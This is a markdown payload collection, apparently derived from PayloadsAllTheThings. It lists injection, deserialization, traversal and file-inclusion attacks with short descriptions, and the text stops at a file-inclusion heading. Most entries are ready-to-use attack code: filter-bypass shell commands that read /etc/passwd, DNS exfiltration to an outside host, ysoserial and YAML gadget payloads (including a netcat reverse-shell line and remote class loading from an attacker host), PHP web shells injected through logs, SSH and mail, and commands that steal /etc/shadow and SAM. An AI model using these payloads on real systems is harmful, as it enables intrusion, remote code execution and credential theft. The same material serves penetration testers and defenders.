# Attack Payloads & Techniques
> Source: PayloadsAllTheThings | Entries: 281 | Platform: cross_platform, linux, windows


## Index

- [command_injection](#commandinjection)
- [crlf_injection](#crlfinjection)
- [csv_injection](#csvinjection)
- [deserialization](#deserialization)
- [directory_traversal](#directorytraversal)
- [file_inclusion](#fileinclusion)
- [file_upload](#fileupload)
- [latex_injection](#latexinjection)
- [ldap_injection](#ldapinjection)
- [nosql_injection](#nosqlinjection)
- [sql_injection](#sqlinjection)
- [ssti](#ssti)


### command_injection

#### argument_injection
[Command Injection] Gain a command execution when you can only append arguments to an existing command. Use this webs...
**Categories:** command_injection, filter_bypass
```
chrome '--gpu-launcher="id>/tmp/foo"'
```

#### backgrounding_long_running_commands
[Command Injection] In some instances, you might have a long running command that gets killed by the process injectin...
**Categories:** command_injection, filter_bypass
```
nohup sleep 120 > /dev/null &
```

#### basic_commands
[Command Injection] Execute the command and voila :p
**Categories:** command_injection, filter_bypass
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

#### bypass_characters_filter
[Command Injection] Commands execution without backslash and slash - linux bash
**Categories:** command_injection, filter_bypass
```
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

#### bypass_characters_filter_via_hex_encoding
[Command Injection] Bypass Characters Filter Via Hex Encoding
**Categories:** command_injection, filter_bypass
```
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

#### bypass_with
[Command Injection] $0`: Refers to the name of the script if it's being run as a script. If you're in an interactive...
**Categories:** command_injection, filter_bypass
```
who$@ami
echo whoami|$0
```

#### bypass_with_a_line_return
[Command Injection] Commands can also be run in sequence with newlines
**Categories:** command_injection, filter_bypass
```
original_cmd_by_server
ls
```

#### bypass_with_backslash_and_slash
[Command Injection] Bypass With Backslash and Slash
**Categories:** command_injection, filter_bypass
```
w\ho\am\i
/\b\i\n/////s\h
```

#### bypass_with_backslash_newline
[Command Injection] Commands can be broken into parts by using backslash followed by a newline
**Categories:** command_injection, filter_bypass
```
$ cat /et\
  c/pa\
  sswd
```

#### bypass_with_brace_expansion
[Command Injection] Bypass With Brace Expansion
**Categories:** command_injection, filter_bypass
```
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

#### bypass_with_double_quote
[Command Injection] Bypass With Double Quote
**Categories:** command_injection, filter_bypass
```
w"h"o"am"i
wh""oami
"wh"oami
```

#### bypass_with_single_quote
[Command Injection] Bypass With Single Quote
**Categories:** command_injection, filter_bypass
```
w'h'o'am'i
wh''oami
'w'hoami
```

#### bypass_with_tilde_expansion
[Command Injection] Bypass With Tilde Expansion
**Categories:** command_injection, filter_bypass
```
echo ~+
echo ~-
```

#### bypass_with_variable_expansion
[Command Injection] Bypass With Variable Expansion
**Categories:** command_injection, filter_bypass
```
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### bypass_with_wildcards
[Command Injection] Bypass With Wildcards
**Categories:** command_injection, filter_bypass
```
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

#### bypass_without_space
[Command Injection] $IFS` is a special shell variable called the Internal Field Separator. By default, in many shells...
**Categories:** command_injection, filter_bypass
```
cat${IFS}/etc/passwd
  ls${IFS}-la
```

#### chaining_commands
[Command Injection] In many command-line interfaces, especially Unix-like systems, there are several characters that...
**Categories:** command_injection, filter_bypass
```
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```

#### command_injection_methodology
Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary com...
**Categories:** command_injection, filter_bypass
```
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

#### context_inside_commands_with_single_and_double_quote
[Command Injection] echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS} echo '1;sleep${IFS}9;#${I...
**Categories:** command_injection, filter_bypass
```
Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # Context inside commands with single and double quote:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

#### dns_based_data_exfiltration
[Command Injection] Based on the tool from HoLyVieR/dnsbin, also hosted at dnsbin.zhack.ca Go to dnsbin.zhack.ca Exec...
**Categories:** command_injection, filter_bypass
```
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

#### inside_a_command
Command injection using backticks.
**Categories:** command_injection, filter_bypass
```
original_cmd_by_server `cat /etc/passwd`
```

#### polyglot_command_injection
A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultan...
**Categories:** command_injection, filter_bypass
```
Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # Context inside commands with single and double quote:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

#### time_based_data_exfiltration
[Command Injection] Extracting data char by char and detect the correct value based on the delay. Correct value: wait...
**Categories:** command_injection, filter_bypass
```
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
```

### crlf_injection

#### cross_site_scripting
Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a...
**Categories:** crlf_injection, header_injection
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

#### filter_bypass
[CRLF Injection] RFC 7230 states that most HTTP header field values use only a subset of the US-ASCII charset. > Newl...
**Categories:** crlf_injection, header_injection
```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
```

#### open_redirect
[CRLF Injection] Inject a `Location` header to force a redirect for the user.
**Categories:** crlf_injection, header_injection
```
%0d%0aLocation:%20http://myweb.com
```

#### session_fixation
[CRLF Injection] A typical HTTP response header looks like this:
**Categories:** crlf_injection, header_injection
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123
```

### csv_injection

#### csv_injection_methodology
CSV Injection, also known as Formula Injection, is a security vulnerability that occurs when untrusted input is inclu...
**Categories:** csv_injection, formula_injection
```
=
+
–
@
```

#### google_sheets
[CSV Injection] Google Sheets allows some additional formulas that are able to fetch remote URLs: IMPORTXML(url, xpat...
**Categories:** csv_injection, formula_injection
```
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

### deserialization

#### alternative_tooling
[Insecure Deserialization] pwntester/JRE8u20_RCE_Gadget - Pure JRE 8 RCE Deserialization gadget joaomatosf/JexBoss -...
**Categories:** deserialization, remote_code_execution
```
java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
  python deserek.py yss_base.bin --format python > yss_url.py
  python yss_url.py yss_new.bin
  java -cp JavaSerializationTestSuite DeSerial yss_new.bin
```

#### binaryformatter
[Insecure Deserialization] > The BinaryFormatter type is dangerous and is not recommended for data processing. Applic...
**Categories:** deserialization, remote_code_execution
```
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

#### encryption
[Insecure Deserialization] By default MyFaces uses DES as encryption algorithm and HMAC-SHA1 to authenticate the View...
**Categories:** deserialization, remote_code_execution
```
<param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>   
<param-name>org.apache.myfaces.SECRET</param-name>   
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
```

#### finding_and_using_gadgets
[Insecure Deserialization] Also called `"PHP POP Chains"`, they can be used to gain RCE on the system. In PHP source...
**Categories:** deserialization, remote_code_execution
```
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

#### funcster
[Insecure Deserialization] funcster
**Categories:** deserialization, remote_code_execution
```
{"rce":{"__js_function":"function(){CMD=\"cmd /c calc\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()"}}
```

#### general_concept
[Insecure Deserialization] The following magic methods will help you for a PHP Object injection __wakeup()` when an o...
**Categories:** deserialization, remote_code_execution
```
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # nothing happens here
    }
?>
```

#### json_deserialization
[Insecure Deserialization] Multiple libraries can be used to handle JSON in Java. json-io Jackson Fastjson Genson Fle...
**Categories:** deserialization, remote_code_execution
```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

#### jsonnet
[Insecure Deserialization] In C# source code, look for `JsonConvert.DeserializeObject<Expected>(json, new JsonSeriali...
**Categories:** deserialization, remote_code_execution
```
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

#### losformatter
[Insecure Deserialization] Use `BinaryFormatter` internally.
**Categories:** deserialization, remote_code_execution
```
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

#### marshal_deserialization
[Insecure Deserialization] Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to...
**Categories:** deserialization, remote_code_execution
```
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

#### netdatacontractserializer
[Insecure Deserialization] > It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable o...
**Categories:** deserialization, remote_code_execution
```
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

#### node_serialize
[Insecure Deserialization] > An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data...
**Categories:** deserialization, remote_code_execution
```
var y = {
        rce : function(){
            require('child_process').exec('ls /', function(error,
            stdout, stderr) { console.log(stdout) });
        },
    }
    var serialize = require('node-serialize');
    console.log("Serialized: \n" + serialize.serialize(y));
```

#### object_injection
[Insecure Deserialization] Vulnerable code:
**Categories:** deserialization, remote_code_execution
```
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

#### pickle
[Insecure Deserialization] The following code is a simple example of using `cPickle` in order to generate an auth_tok...
**Categories:** deserialization, remote_code_execution
```
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

#### pop_gadgets
[Insecure Deserialization] These gadgets must have the following properties: Serializable Public/settable variables M...
**Categories:** deserialization, remote_code_execution
```
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
```

#### pyyaml
[Insecure Deserialization] YAML deserialization is the process of converting YAML-formatted data back into objects in...
**Categories:** deserialization, remote_code_execution
```
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

#### type_juggling
[Insecure Deserialization] Vulnerable code:
**Categories:** deserialization, remote_code_execution
```
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

#### xmlserializer
[Insecure Deserialization] In C# source code, look for `XmlSerializer(typeof(<TYPE>));`. The attacker must control th...
**Categories:** deserialization, remote_code_execution
```
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

#### yaml_deserialization
[Insecure Deserialization] SnakeYAML jYAML YamlBeans SnakeYAML**: SnakeYAML is a popular Java-based library used for...
**Categories:** deserialization, remote_code_execution
```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

#### ysoserial
[Insecure Deserialization] frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Ja...
**Categories:** deserialization, remote_code_execution
```
java -jar ysoserial.jar CommonsCollections1 calc.exe > commonpayload.bin
java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' > payload.bin
java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64
```

### directory_traversal

#### asp_net_cookieless
[Directory Traversal] When cookieless session state is enabled. Instead of relying on a cookie to identify the sessio...
**Categories:** directory_traversal, path_traversal
```
/(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
```

#### directory_traversal_methodology
[Directory Traversal] We can use the `..` characters to access the parent directory, the following strings are severa...
**Categories:** directory_traversal, path_traversal
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

#### double_url_encoding
Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters ar...
**Categories:** directory_traversal, path_traversal
```
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

#### iis_short_name
[Directory Traversal] The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services...
**Categories:** directory_traversal, path_traversal
```
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
```

#### java_url_protocol
[Directory Traversal] Java's URL protocol when `new URL('')` is used allows the format `url:URL
**Categories:** directory_traversal, path_traversal
```
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

#### linux_files
[Directory Traversal] Operating System and Informations
**Categories:** directory_traversal, path_traversal
```
/etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
```

#### mangled_path
[Directory Traversal] Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicat...
**Categories:** directory_traversal, path_traversal
```
..././
...\.\
```

#### null_bytes
A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming langua...
**Categories:** directory_traversal, path_traversal
```
{{BaseURL}}/.%00./.%00./etc/passwd
```

#### reverse_proxy_url_implementation
[Directory Traversal] Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allow...
**Categories:** directory_traversal, path_traversal
```
..;/
```

#### unc_share
[Directory Traversal] A UNC (Universal Naming Convention) share is a standard format used to specify the location of...
**Categories:** directory_traversal, path_traversal
```
\\localhost\c$\windows\win.ini
```

#### unicode_encoding
[Directory Traversal] | Character | Encoded | | --- | -------- | | `.` | `%u002e` | | `/` | `%u2215` | | `\` | `%u221...
**Categories:** directory_traversal, path_traversal
```
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

#### url_encoding
[Directory Traversal] | Character | Encoded | | --- | -------- | | `.` | `%2e` | | `/` | `%2f` | | `\` | `%5c` | Exam...
**Categories:** directory_traversal, path_traversal
```
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

#### windows_files
[Directory Traversal] The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, makin...
**Categories:** directory_traversal, path_traversal
```
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

### file_inclusion

#### double_encoding
[File Inclusion] Double Encoding
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### leak_file_content_from_error_based_oracle
[File Inclusion] convert.iconv://`: convert input into another folder (`convert.iconv.utf-16le.utf-8`) dechunk://`: i...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!
```

#### leak_file_content_inside_a_custom_format_output
[File Inclusion] ambionics/wrapwrap - Generates a `php://filter` chain that adds a prefix and a suffix to the content...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
```

#### leak_file_content_using_blind_file_read_primitive
[File Inclusion] ambionics/lightyear
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
code remote.py # edit Remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!
```

#### lfi_to_rce_via_controlled_log_file
[File Inclusion] Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and in...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

#### lfi_to_rce_via_php_pearcmd
[File Inclusion] PEAR is a framework and distribution system for reusable PHP components. By default `pearcmd.php` is...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
register_argc_argv = On
```

#### lfi_to_rce_via_php_sessions
[File Inclusion] Check if the website use PHP Session (PHPSESSID)
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

#### lfi_to_rce_via_proc_fd
[File Inclusion] Upload a lot of shells (for example : 100) Include `/proc/$PID/fd/$FD` where `$PID` is the PID of th...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

#### lfi_to_rce_via_proc_self_environ
[File Inclusion] Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

#### lfi_to_rce_via_upload
[File Inclusion] If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=path/to/uploaded/file.png
```

#### lfi_to_rce_via_upload_race
[File Inclusion] Upload a file and trigger a self-inclusion. Repeat the upload a shitload of time to: increase our od...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

#### linux_version
[File Inclusion] Extract `/etc/shadow` files.
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=../../../../../../etc/shadow
```

#### local_file_inclusion
File Inclusion Vulnerability** should be differentiated from **Path Traversal**. The Path Traversal vulnerability all...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
<?php
$file = $_GET['page'];
include($file);
?>
```

#### null_byte
[File Inclusion] :warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=../../../etc/passwd%00
```

#### path_truncation
[File Inclusion] On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars wi...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

#### phar_archive_structure
[File Inclusion] PHAR files work like ZIP files, when you can use the `phar://` to access files stored inside them. C...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
<?php
    $phar = new Phar('archive.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->stopBuffering();
  ?>
```

#### phar_deserialization
[File Inclusion] :warning: This technique doesn't work on PHP 8+, the deserialization has been removed. If a file ope...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

...
echo file_exists($_GET['page']);
```

#### rce_via_apache_logs
[File Inclusion] Poison the User-Agent in access logs:
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

#### rce_via_mail
[File Inclusion] First send an email using the open SMTP then include the log file located at `http://example.com/ind...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

#### rce_via_ssh
[File Inclusion] Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

#### remote_file_inclusion
> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usua...
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
allow_url_include = On
```

#### utf_8_encoding
[File Inclusion] UTF-8 Encoding
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

#### windows_version
[File Inclusion] Extract `sam` and `system` files.
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

#### wrapper_data
[File Inclusion] The payload encoded in base64 is "`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`".
**Categories:** file_inclusion, local_file_inclusion, remote_file_inclusion
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```

#### wrapper_expect
